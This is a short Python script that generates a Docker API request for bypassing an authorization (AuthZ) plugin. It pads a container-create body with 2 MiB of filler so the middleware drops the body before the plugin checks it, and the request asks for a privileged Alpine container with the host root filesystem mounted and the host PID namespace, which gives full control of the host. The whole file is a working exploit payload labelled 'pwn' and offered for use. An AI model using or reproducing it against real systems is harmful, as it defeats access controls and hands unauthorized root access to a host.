#!/usr/bin/env python3
"""Generates the AuthZ-bypass payload: a privileged-container create
request padded with an inert 2 MiB JSON field (_padding).
Docker ignores unknown fields; the AuthZ middleware drops the whole
body (>= 1 MiB) before the plugin sees it — then processes it anyway."""
import json

d = {"Image": "alpine:3.20",
     "Cmd": ["sleep", "infinity"],
     "HostConfig": {"Privileged": True,
                    "Binds": ["/:/host"],
                    "PidMode": "host"},
     "_padding": "A" * 2097152}
open("/tmp/pwn.json", "w").write(json.dumps(d))
print("payload written: /tmp/pwn.json")
